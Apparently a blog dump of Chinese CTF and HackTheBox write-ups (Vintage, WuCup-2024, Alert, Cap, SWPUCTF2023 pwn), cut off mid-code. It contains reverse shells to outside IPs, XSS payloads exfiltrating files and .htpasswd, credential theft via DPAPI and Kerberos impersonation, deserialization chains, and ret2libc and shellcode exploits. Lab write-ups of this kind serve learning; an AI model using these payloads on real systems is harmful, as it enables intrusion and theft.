C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\u0026gt; dir -h\rDirectory: C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\rMode LastWriteTime Length Name\r---- ------------- ------ ----\r-a-hs- 12/4/2024 2:46 AM 740 1fe00192-86ec-4689-a4f2-f8c2336edaf4\r-a-hs- 6/7/2024 1:17 PM 740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847\r-a-hs- 6/7/2024 1:17 PM 740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b\r-a-hs- 6/7/2024 1:17 PM 904 BK-VINTAGE\r-a-hs- 12/4/2024 2:46 AM 24 Preferred\r*Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\u0026gt; download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b 然后进入解密\n└─# impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE]\rVersion : 2 (2)\rGuid : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b\rFlags : 0 (0)\rPolicy : 0 (0)\rMasterKeyLen: 00000088 (136)\rBackupKeyLen: 00000068 (104)\rCredHistLen : 00000000 (0)\rDomainKeyLen: 00000174 (372)\rDecrypted key with User Key (MD4 protected)\rDecrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a\r└─# impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL]\rLastWritten : 2024-06-07 15:08:23\rFlags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)\rPersist : 0x00000003 (CRED_PERSIST_ENTERPRISE)\rType : 0x00000001 (CRED_TYPE_GENERIC)\rTarget : LegacyGeneric:target=admin_acc\rDescription : Unknown : Username : vintage\\c.neri_adm\rUnknown : Uncr4ck4bl3P4ssW0rd0312 得到c.neri_adm的密码为：Uncr4ck4bl3P4ssW0rd0312\n接下来就是将C.NERL_ADM添加到DELEGATEDADMINS中\n└─# bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d \u0026#34;VINTAGE.HTB\u0026#34; -u c.neri_adm -p \u0026#39;Uncr4ck4bl3P4ssW0rd0312\u0026#39; -k add groupMember \u0026#34;DELEGATEDADMINS\u0026#34; \u0026#34;SVC_SQL\u0026#34; [+] SVC_SQL added to DELEGATEDADMINS\r└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k set object \u0026#34;SVC_SQL\u0026#34; servicePrincipalName -v \u0026#34;cifs/fake\u0026#34; [+] SVC_SQL\u0026#39;s servicePrincipalName has been updated 获取这个SVC的票据\n└─# impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb\r└─# export KRB5CCNAME=svc_sql.ccache 假冒L.BIANCHI_ADM用户请求cifs/dc01.vintage.htb 服务的服务票据。成功获取该票据后，可以使用它来访问该服务。\n└─# impacket-getST -spn \u0026#39;cifs/dc01.vintage.htb\u0026#39; -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \u0026#39;vintage.htb/svc_sql:Zer0the0ne\u0026#39; └─# export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache 现在有了L.BIANCHI的票据了，可以直接通过wmiexec执行命令\n└─# impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [*] SMBv3.0 dialect used\r[!] Launching semi-interactive shell - Careful what you execute\r[!] Press help for extra shell commands\rC:\\\u0026gt; whoami\rvintage\\l.bianchi_adm\rC:\\\u0026gt; type Users\\Administrator\\Desktop\\root.txt Summary #\r由于Kerberos的认证机制对时区和系统时间验证非常严格，在操作的过程中，比如BloodyAD或者impacket的相关脚本使用时，如果没有用ntupdate同步时间，会导致命令失败。我也是十分艰难的在进行复现。\n本文也是根据别人的WP进行复现，学习到了很多新的工具以及思路：Bloodhound、bloodyAD、ldap信息枚举以及Impacket系列的Kerberos相关的操作。\n总的来说理解还是非常浅显，我自己肯定是打不了的，只能通过复现来学习学习思路。\nI HATE WINDOWS!!!\n","date":"2024-12-03","externalUrl":null,"permalink":"/posts/2024/12/hackthebox-vintage/","section":"Posts","summary":"","title":"HTB-Vintage","type":"posts"},{"content":"","date":"2024-12-01","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"\rWeb #\rSign #\r题目介绍: POST浅浅签个到吧\nHelloHacker #\r题目介绍: 你看到的不一定是真的\n源码如下\n\u0026lt;?php\rhighlight_file(__FILE__);\rerror_reporting(0);\rinclude_once \u0026#39;check.php\u0026#39;;\rinclude_once \u0026#39;ban.php\u0026#39;;\r$incompetent = $_POST[\u0026#39;incompetent\u0026#39;];\r$WuCup = $_POST[\u0026#39;WuCup\u0026#39;];\rif ($incompetent !== \u0026#39;HelloHacker\u0026#39;) {\rdie(\u0026#39;Come invade!\u0026#39;);\r}\r$required_chars = [\u0026#39;p\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;z\u0026#39;];\r$is_valid = true;\rif (!checkRequiredChars($WuCup, $required_chars)) {\r$is_valid = false;\r}\rif ($is_valid) {\r$prohibited_file = \u0026#39;prohibited.txt\u0026#39;;\rif (file_exists($prohibited_file)) {\r$file = fopen($prohibited_file, \u0026#39;r\u0026#39;);\rwhile ($line = fgets($file)) {\r$line = rtrim($line, \u0026#34;\\r\\n\u0026#34;); if ($line === \u0026#39;\u0026#39; \u0026amp;\u0026amp; strpos($WuCup, \u0026#39; \u0026#39;) === false) {\rcontinue;\r}\rif (stripos($WuCup, $line) !== false) {\rfclose($file); die(\u0026#39;this road is blocked\u0026#39;);\r}\r}\rfclose($file); }\reval($WuCup);\r} else {\rdie(\u0026#39;NO！NO！NO！\u0026#39;);\r}\r?\u0026gt; 简单分析一下，post的参数中incompetent是HelloHacker\nWuCup必须包含数组中的所有字符，并且有一定的排列组合\nprohibited.txt是可以访问的，将其复制下来\nimport itertools\r# 可能的字母\rletters = \u0026#39;pevanxorz\u0026#39;\r# 所有可能的排列组合\rall_combinations = {\u0026#39;\u0026#39;.join(p) for p in itertools.permutations(letters)}\r# 从文件中读取现有组合\rexisting_combinations = set()\rwith open(\u0026#39;prohibited.txt\u0026#39;, \u0026#39;r\u0026#39;) as file:\rfor line in file:\rexisting_combinations.add(line.strip())\r# 查找缺失的组合\rmissing_combinations = all_combinations - existing_combinations\r# 输出缺失的组合\rprint(f\u0026#39;缺失的组合数量: {len(missing_combinations)}\u0026#39;)\rfor combo in missing_combinations:\rprint(combo) 然后进入命令执行，一些特殊字符在prohibited.txt中被过滤掉了\npassthru是可以使用的\nincompetent=HelloHacker\u0026amp;WuCup=oxzverapn;passthru(\u0026#34;$_POST[a]\u0026#34;);\u0026amp;a=cat /flag TimeCage #\r题目介绍: 你知道时间吗？\n\u0026lt;?php\rshow_source(__FILE__);\rinclude \u0026#39;secret.php\u0026#39;;\rif(isset($_GET[\u0026#39;input\u0026#39;])){\r$guess = $_GET[\u0026#39;input\u0026#39;];\r$target = random_int(114 , 114 + date(\u0026#39;s\u0026#39;) * 100000);\rif(intval($guess) === intval($target)){\recho \u0026#34;The next challenge in \u0026#34;.$key1;\r}\relse{\recho \u0026#34;Guess harder.\u0026#34;;\r}\r} 这里的随机数范围，只需要等待时间到达0秒，那么target就是114\n可以在50多秒的时候用bp发包\n进入第二层\n\u0026lt;?php\rshow_source(__FILE__);\rinclude \u0026#39;secret.php\u0026#39;;\rif(isset($_POST[\u0026#39;pass\u0026#39;])){\r$pass = $_POST[\u0026#39;pass\u0026#39;];\rif(strlen($pass) != strlen($password)){\rdie(\u0026#34;Wrong Length!\u0026#34;);\r}\r$isMatch = true;\rfor($i = 0;$i \u0026lt; strlen($password); $i++){\rif($pass[$i] != $password[$i]){\r$isMatch = false;\rbreak;\r}\rsleep(1);\r}\rif($isMatch){\recho \u0026#34;The final challenge in \u0026#34;.$key2;\r}\relse{\recho \u0026#34;Wrong Pass!\u0026#34;;\r}\r}\r//Only digital characters in the password. 就是猜数字，对每一位进行检查，如果正确就会停留一秒，这里可以写脚本也可以自己手注\nimport requests\rimport time\rimport random\rurl=\u0026#34;http://challenge.wucup.cn:49820/Trapping2147483647.php\u0026#34;\rpasswd=\u0026#39;56983215\u0026#39;\rpayload={\u0026#34;pass\u0026#34;:passwd}\rstart=time.time()\rreq=requests.post(url,data=payload)\rend=time.time()\rprint(req.text)\rprint(end-start) 最终得到的passwd就是56983215\n进入第三层\n\u0026lt;?php\rif(isset($_POST[\u0026#39;cmd\u0026#39;])){\r$cmd = $_POST[\u0026#39;cmd\u0026#39;];\r$pattern = \u0026#39;/[\\{\\}\\[\\]\\(\\)\u0026amp;\u0026lt;\u0026gt;`\\s\\\\\\\\]/\u0026#39;;\rif(preg_match($pattern,$cmd)){\rdie(\u0026#34;Invalid Input!\u0026#34;);\r}\rshell_exec($cmd);\r}\relse{\rshow_source(__FILE__);\r}\r//flag is in /flag 由于这里shell_exec是无回显的，我使用的方式是bash反弹shell到服务器上\nHYH的反弹Shell生成器 (hyhforever.top) cmd=echo$IFS$1\u0026#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ5LjIzNS4xNjQuMTA0LzEwMCAwPiYx\u0026#34;|base64$IFS$1-d|bash 得到flag\nezPHP #\r网站扫描扫到了：flag.php、hint.php\n参考这篇文章\nphp＜= 7 . 4 . 21 development server源码泄露漏洞复现 - 凪白Kw - 博客园 (cnblogs.com) 关掉burp的Update Content-Length\nGET /flag.php HTTP/1.1\rHost: challenge.wucup.cn:48919\rGET /Kawakaze HTTP/1.1 得到flag.php的源码\n\u0026lt;?php\rerror_reporting(0);\rclass a{\rpublic $OAO;\rpublic $QAQ;\rpublic $OVO;\rpublic function __toString(){\rif(!preg_match(\u0026#39;/hello/\u0026#39;, OVO)){\rif ($this-\u0026gt;OVO === \u0026#34;hello\u0026#34;) {\rreturn $this-\u0026gt;OAO-\u0026gt;QAQ;\r}\t}\r}\rpublic function __invoke(){\rreturn $this-\u0026gt;OVO;\r}\r}\rclass b{\rpublic $pap;\rpublic $vqv;\rpublic function __get($key){\r$functioin = $this-\u0026gt;pap;\rreturn $functioin();\r}\rpublic function __toString(){\rreturn $this-\u0026gt;vqv;\r}\r}\rclass c{\rpublic $OOO;\rpublic function __invoke(){\r@$_ = $this-\u0026gt;OOO;\r$___ = $_GET;\rvar_dump($___);\rif (isset($___[\u0026#39;h_in.t\u0026#39;])) {\runset($___[\u0026#39;h_in.t\u0026#39;]);\r}\rvar_dump($___);\recho @call_user_func($_, ...$___); }\r}\rclass d{\rpublic $UUU;\rpublic $uuu;\rpublic function __wakeup(){\recho $this-\u0026gt;UUU;\r}\rpublic function __destruct(){\r$this-\u0026gt;UUU;\r}\r}\rif(isset($_GET[\u0026#39;h_in.t\u0026#39;])){\runserialize($_GET[\u0026#39;h_in.t\u0026#39;]);\r}\r?\u0026gt; 简单分析一下\nd-\u0026gt;__wakeup\ra-\u0026gt;__toString\rb-\u0026gt;__get\rc-\u0026gt;__invoke h_in.t用中括号绕过\n在phpinfo里面可以看到几乎所有的命令执行函数都被禁止了\n可以使用file_get_contents函数绕过，直接打印内容\n\u0026lt;?php\rclass a\r{\rpublic $OAO;\rpublic $QAQ;\rpublic $OVO=\u0026#34;hello\u0026#34;;\r}\rclass b\r{\rpublic $pap;\rpublic $vqv;\r}\rclass c\r{\rpublic $OOO=\u0026#34;file_get_contents\u0026#34;;\r}\rclass d\r{\rpublic $UUU;\rpublic $uuu;\r}\r$d=new d();\r$a=new a();\r$b=new b();\r$d-\u0026gt;UUU=$a;\r$a-\u0026gt;OAO=$b;\r$c=new c();\r$b-\u0026gt;pap=$c;\recho serialize($d);\r#O:1:\u0026#34;d\u0026#34;:2:{s:3:\u0026#34;UUU\u0026#34;;O:1:\u0026#34;a\u0026#34;:3:{s:3:\u0026#34;OAO\u0026#34;;O:1:\u0026#34;b\u0026#34;:2:{s:3:\u0026#34;pap\u0026#34;;O:1:\u0026#34;c\u0026#34;:1:{s:3:\u0026#34;OOO\u0026#34;;s:17:\u0026#34;file_get_contents\u0026#34;;}s:3:\u0026#34;vqv\u0026#34;;N;}s:3:\u0026#34;QAQ\u0026#34;;N;s:3:\u0026#34;OVO\u0026#34;;s:5:\u0026#34;hello\u0026#34;;}s:3:\u0026#34;uuu\u0026#34;;N;} 拿到flag\nCrypto #\rEasy #\r把两个代码扔给AI，分析后给出脚本\ndef rc4(key, data):\rS = list(range(256))\rkey_length = len(key)\rj = 0\r# Key Scheduling Algorithm (KSA)\rfor i in range(256):\rj = (j + S[i] + ord(key[i % key_length])) % 256\rS[i], S[j] = S[j], S[i]\r# Pseudo-Random Generation Algorithm (PRGA)\ri = 0\rj = 0\routput = []\rfor m in range(len(data)):\ri = (i + 1) % 256\rj = (j + S[i]) % 256\rS[i], S[j] = S[j], S[i]\routput.append(data[m] ^ S[(S[i] + S[j]) % 256])\rreturn bytes(output)\r# Given key and hex-encoded flag\rkey = \u0026#34;hello world\u0026#34;\rhex_flag = \u0026#34;d8d2963e0d8ab8533d2a7fe296c5292339246eba0d292d5752578359322c3a77892dfa7261b84f\u0026#34;\r# Convert hex string to byte array\rflag_bytes = bytes.fromhex(hex_flag)\r# Decrypt the flag\rdecrypted_flag = rc4(key, flag_bytes)\rprint(\u0026#34;Decrypted flag:\u0026#34;, decrypted_flag.decode()) Misc #\rSign #\rCyberchef直接解密\n旋转木马 #\rflag1和flag2都非常大，不好直接打开\n读取前1000个字符尝试解密\n似乎像是base64嵌套解密\n尝试把flag1和flag2连接起来进行解密\n每次解密后都写入flag.txt\n最后得到的数字拿去cyberchef解密\n太极 #\r从第三个点中可以发现\ntai ji sheng liang yi\r太在第一位取t\r极在第二位取i\r生在第三位取e\r两在第四位取n\r仪在第五位取i，但是第四点中看到是取y\r太极生两仪-两仪生四象-四象生八卦-八卦定吉凶-吉凶生大业\r对应得到下面的flag\rWuCup{tieny-lieig-sieau-bunig-jieay} ","date":"2024-12-01","externalUrl":null,"permalink":"/posts/2024/12/%E5%90%BE%E6%9D%AF-2024/","section":"Posts","summary":"","title":"WuCup-2024","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap Scan #\rnmap alert.htb -sC -sV -T4 -Pn 开放端口：22、80，httpserver是Apache\n进入80端口的网页，发现存在Markdown文件上传\n根据题目名称Alert猜测，应该与XSS漏洞有关\nSubdomain Fuzz #\rffuf -w main.txt -u http://alert.htb -H \u0026#34;Host:FUZZ.alert.htb\u0026#34; -ac 发现存在statistics的子域名\nXSS #\r这个是通过XSS读取到message.php的内容。具体操作如下：\n使用这个载荷，这个是预览md的时候的URL模板，把page设置为messages。\n\u0026lt;script\u0026gt;\rfetch(\u0026#34;http://alert.htb/index.php?page=messages\u0026#34;)\r.then(response =\u0026gt; response.text()) // Convert the response to text\r.then(data =\u0026gt; {\rfetch(\u0026#34;http://10.10.16.90/?data=\u0026#34; + encodeURIComponent(data));\r})\r.catch(error =\u0026gt; console.error(\u0026#34;Error fetching the messages:\u0026#34;, error));\r\u0026lt;/script\u0026gt; 然后另起一个python -m http.server 80，会收到URL加密后的页面内容\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Alert - Markdown Viewer\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=alert\u0026#34;\u0026gt;Markdown Viewer\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=contact\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=about\u0026#34;\u0026gt;About Us\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=donate\u0026#34;\u0026gt;Donate\u0026lt;/a\u0026gt;\r\u0026lt;a href=\u0026#34;index.php?page=messages\u0026#34;\u0026gt;Messages\u0026lt;/a\u0026gt; \u0026lt;/nav\u0026gt;\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Messages\u0026lt;/h1\u0026gt;\u0026lt;ul\u0026gt;\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#39;messages.php?file=2024-03-10_15-48-34.txt\u0026#39;\u0026gt;2024-03-10_15-48-34.txt\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;footer\u0026gt;\r\u0026lt;p style=\u0026#34;color: black;\u0026#34;\u0026gt;© 2024 Alert. All rights reserved.\u0026lt;/p\u0026gt;\r\u0026lt;/footer\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; 从这里可以看到管理员查看的时候是有messages.php?file这个参数的。\n在markdown文件中插入有效载荷\n\u0026lt;script\u0026gt;\rfetch(\u0026#34;http://alert.htb/messages.php?file=filepath\u0026#34;)\r.then(response =\u0026gt; response.text())\r.then(data =\u0026gt; {\rfetch(\u0026#34;http://10.10.xx.xx:8888/?file_content=\u0026#34; + encodeURIComponent(data));\r});\r\u0026lt;/script\u0026gt; 经过尝试，无法直接读取到/etc/passwd这种敏感文件\n但是考虑到web服务器使用的是Apache，可以参考一下这篇文章\n什么是.htpasswd文件？-CSDN博客 于是有效载荷就修改为了这样↓\n\u0026lt;script\u0026gt;\rfetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd\u0026#34;)\r.then(response =\u0026gt; response.text())\r.then(data =\u0026gt; {\rfetch(\u0026#34;http://10.10.16.11:8888/?file_content=\u0026#34; + encodeURIComponent(data));\r});\r\u0026lt;/script\u0026gt; 将其上传后，复制分享链接\n然后进入到Contact Us\n点击发送，会在终端收到加密字符串\n%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A\r\u0026lt;pre\u0026gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/\u0026lt;/pre\u0026gt; 这看起来像是一种hash加密\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long alert.hash 使用SSH登录可以得到User.txt\nPrivilege Escalation #\r遍历目录没有什么可疑文件，并且发现另一个用户david\n上传linpeas，发现8080是打开的\n将端口转发出来\nssh -L 8080:127.0.0.1:8080 albert@alert.htb 在/opt目录下发现这个Website Monitor的文件夹，并且是有root权限的\n\u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;/dev/tcp/10.10.16.11/100 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; 写入反弹Shell的木马，并且设置监听\n尝试访问下面这个路径\nhttp://127.0.0.1:8080/config/hyh.php 得到反弹Shell，拿到Root权限\nSummary #\r这个XSS漏洞与以往CTF中遇到的XSS有点不一样\n他并不是用来窃取身份凭证，而是用来进行主动访问，将信息外带\n","date":"2024-11-30","externalUrl":null,"permalink":"/posts/2024/11/htb-alert/","section":"Posts","summary":"","title":"HTB-Alert","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy User.txt #\r进入网页，点击Security Snapshot，可以看到url进入到了/data/4，下面存在download路由，将其下载下来，并没有任何东西\n尝试遍历/data目录下的数字，在/data/0发现不同的文件\n使用wireshark进行查看，发现在FTP协议中存在账户信息明文泄露\nuser: nathan\rpass: Buck3tH4TF0RM3! 可以使用ssh直接登录，获取到user.txt\nRoot.txt #\r上传linpeas.sh\n在Files with capabilities，中发现python3.8这个文件中可以使用setuid来进行切换用户\n那么可以将uid设置为0（root的uid通常为0），然后去执行bash\npython3 -c \u0026#34;import os;os.setuid(0);os.system(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Summary #\r这个Cap机器确实简单哈，好久没打HTB的靶机了，前段时间又在打CTF，最新的靶机感觉难度又比较高。\n","date":"2024-11-24","externalUrl":null,"permalink":"/posts/2024/11/hackthebox-cap/","section":"Posts","summary":"","title":"HTB-Cap","type":"posts"},{"content":"","date":"2024-11-24","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"2024-11-24","externalUrl":null,"permalink":"/tags/swpu/","section":"Tags","summary":"","title":"Swpu","type":"tags"},{"content":"\r前言 #\r之前学习过一段时间Pwn，后面就丢掉了，再重新回来补一补\n签到 #\rchecksec检查一下\n用64位IDA打开\n简单的栈溢出，backdoor的位置直接给了\n写脚本如下，buf的长度就只有48，加上8位的指针，达到backdoor的位置\nfrom pwn import *\rio=remote(\u0026#34;node4.anna.nssctf.cn\u0026#34;,28296)\rtarget=0x000000000040123A\rpayload=b\u0026#39;a\u0026#39;*(48+8)+p64(target)\rio.sendline(payload)\rio.interactive() guess me #\r题目没有附件，先直接连接看看\n是一个简单的猜数字，让AI跑一个二分法的脚本即可，当然也可以手注，这里应该是考察pwntools的使用\nfrom pwn import *\r# 连接到远程服务\rio = remote(\u0026#34;node4.anna.nssctf.cn\u0026#34;, 28024)\r# 读取初始行\rprint(io.recvuntil(b\u0026#39;:\u0026#39;))\r# 二分法查找 0 到 100 之间的数字\rlow, high = 0, 100\rwhile low \u0026lt;= high:\rmid = (low + high) // 2\rio.sendline(str(mid).encode()) # 发送猜测的数字\rresponse = io.recvline() # 获取服务器的响应\r# 打印当前猜测及其响应\rprint(f\u0026#34;Guess: {mid}, Response: {response.decode().strip()}\u0026#34;)\r# 检查响应并调整搜索范围\rif b\u0026#39;Bingo!\u0026#39; in response: # 检查是否猜对了\rio.interactive()\rbreak\relif b\u0026#39;too big\u0026#39; in response:\rhigh = mid - 1 # 调整上界\relif b\u0026#39;too small\u0026#39; in response:\rlow = mid + 1 # 调整下界\relse:\rprint(\u0026#34;Unexpected response:\u0026#34;, response.decode().strip())\rbreak buy #\rchecksec检查\n进入IDA分析，要满足key的条件才能进入后门函数\n在food函数中，存在key的赋值语句\n不过仔细看，money是由v1来决定，而v1不能大于3，把v1设置为一个负数就能获取到money\n进入door函数后就是一个简单的栈溢出\n在mygift里找到/bin/sh的地址\n写脚本\nfrom pwn import *\rio = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;, 28469)\rio.sendline(b\u0026#39;1\u0026#39;)\rio.sendline(b\u0026#39;1\u0026#39;)\rio.sendline(b\u0026#39;-100\u0026#39;)\rio.sendline(b\u0026#39;2\u0026#39;)\rio.sendline(b\u0026#39;2\u0026#39;)\rio.sendline(b\u0026#39;1\u0026#39;)\rtarget=0x000000000040154C\rpayload=b\u0026#39;a\u0026#39;*(10+8)+p64(target)\rio.sendline(payload)\rio.interactive() 拿到flag\nShellcode #\rchecksec\n直接把shellcode发过去就行了\nfrom pwn import *\rcontext(os=\u0026#34;linux\u0026#34;,arch=\u0026#39;amd64\u0026#39;,log_level=\u0026#39;debug\u0026#39;)\rio=remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;, 28409)\rpayload=b\u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rio.sendline(payload)\rio.interactive() ezlibc #\r找了好久找到一篇讲ret2libc相对清晰的文章\nPwn入门笔记（三）函数细节_pwn p64-CSDN博客 checksec，附件中给了libc文件\n进入IDA查看伪代码\n查看不出来具体多少个填充位\n使用pwndbg对附件进行调试，可以看到有报错地址，使用cyclic进行计算，得到填充位是20\n由于题目已经给出了lib.so文件，因此无需计算偏移量\n这里写代码就详细一点\n首先是引用源文件\nelf = ELF(\u0026#39;./ezlibc\u0026#39;) #加载源文件\rlibc = ELF(\u0026#39;./libc-2.31.so\u0026#39;) #加载libc.so 然后进行数据发送\nio.sendline(b\u0026#39;a\u0026#39;*20+p32(write_plt_addr)+p32(0x80491B6)+p32(1)+p32(write_got_addr)+p32(4)) 对上面这个paylaod的解释：20个a溢出后进入write函数，0x80491B6是dofunc函数的地址，也是write函数的返回地址。后面三个参数对应的是：1为write的\u0026quot;写模式\u0026quot;，elf.got.write是打印字符串的地址，4是指字符串的长度。\n为什么write函数的地址要返回到dofunc的开始呢？因为要制造一个循环，第一次dofunc的时候是不知道write函数的地址的，将其打印出来后再进行dofunc函数操作，就可以利用计算偏移量来进行构造payload。（实际上并不一定要是dofunc，只需要在溢出点前面就行）\n可以看到dofunc的地址就在0x80491B6\n简单测试一下拿到write的地址的过程\nfrom pwn import *context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;,log_level=\u0026#34;debug\u0026#34;)io=process(\u0026#39;./ezlibc\u0026#39;)elf=ELF(\u0026#39;./ezlibc\u0026#39;)libc=ELF(\u0026#39;./libc-2.31.so\u0026#39;)write_plt_addr = elf.plt[\u0026#34;write\u0026#34;]write_got_addr = elf.got[\u0026#34;write\u0026#34;]main_addr = 0x80491B6io.recvuntil(b\u0026#34;Hello, there is a ez libc test!!!input:\u0026#34;)io.sendline(b\u0026#39;a\u0026#39;*20+p32(write_plt_addr)+p32(0x80491B6)+p32(1)+p32(write_got_addr)+p32(4))io.recvuntil(b\u0026#39;byebye\u0026#39;)write_addr=u32(io.recv(4))print(hex(write_addr))io.interactive() 可以看到成功获取到write的地址，接下来就是进行计算偏移量\nbase_addr = write_addr - write_offset\rsystem_addr = base_addr + system_offset\rbinsh_addr = base_addr + binsh_offset 然后的话就是进行发送payload\nio.sendline(b\u0026#39;a\u0026#39;*20+p32(system_addr)+p32(1)+p32(binsh_addr))= 格式是和最开始的一样，这里1是system函数的返回地址，不重要，binsh是函数的参数\n完整的代码如下\nfrom pwn import *\rcontext(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;,log_level=\u0026#34;debug\u0026#34;)\r#io=process(\u0026#39;./ezlibc\u0026#39;)\rio=remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;, 28566)\relf=ELF(\u0026#39;./ezlibc\u0026#39;)\rlibc=ELF(\u0026#39;./libc-2.31.so\u0026#39;)\rwrite_plt_addr = elf.plt[\u0026#34;write\u0026#34;]\rwrite_got_addr = elf.got[\u0026#34;write\u0026#34;]\rmain_addr = 0x80491B6\rio.recvuntil(b\u0026#34;Hello, there is a ez libc test!!!input:\u0026#34;)\rio.sendline(b\u0026#39;a\u0026#39;*20+p32(write_plt_addr)+p32(0x80491B6)+p32(1)+p32(write_got_addr)+p32(4))\rio.recvuntil(b\u0026#39;byebye\u0026#39;)\rwrite_addr=u32(io.recv(4))\rsystem_offset = libc.symbols[\u0026#39;system\u0026#39;]\rbinsh_offset = next(libc.search(\u0026#39;/bin/sh\u0026#39;))\rwrite_offset = libc.symbols[\u0026#39;write\u0026#39;]\rbase_addr = write_addr - write_offset\rsystem_addr = base_addr + system_offset\rbinsh_addr = base_addr + binsh_offset\rio.recvuntil(b\u0026#34;Hello, there is a ez libc test!!!input:\u0026#34;)\rio.sendline(b\u0026#39;a\u0026#39;*20+p32(system_addr)+p32(1)+p32(binsh_addr))\rio.interactive() 本题是给出了libc.so文件就可以直接从里面提取，如果没有的话需要使用LibcSearcher来进行搜索\n神奇的strlen #\rchecksec查看，题目提供了libcso文件\n查看IDA伪代码，应该是ret2libc的64位put类型题目\n这里的strlen函数遇到\u0026rsquo;\\x00\u0026rsquo;这个终止符的时候会停止计数，从而绕过长度判断\nPWN PWN PWN !!! 技巧 (1)_pwn传参和接收问题-CSDN博客 待续。。。。\n","date":"2024-11-24","externalUrl":null,"permalink":"/posts/2024/11/swpuctf2023-pwn/","section":"Posts","summary":"","title":"SWPUCTF2023-Pwn","type":"posts"},{"content":"","date":"2024-11-23","externalUrl":null,"permalink":"/tags/litctf/","section":"Tags","summary":"","title":"Litctf","type":"tags"},{"content":"\r世界上最棒的程序员 #\rShift+F12，在全局字符串中查找到flag\nez_XOR #\r使用32位IDA打开，F5查看伪代码\n可以看到存在字符串输入后进行异或，异或是可逆性的\n跟进查看XOR函数的内容，很明显是每个字符和9进行异或\ns=\u0026#39;E`}J]OrQF[V8zV:hzpV}fVF[t\u0026#39;\rfor i in 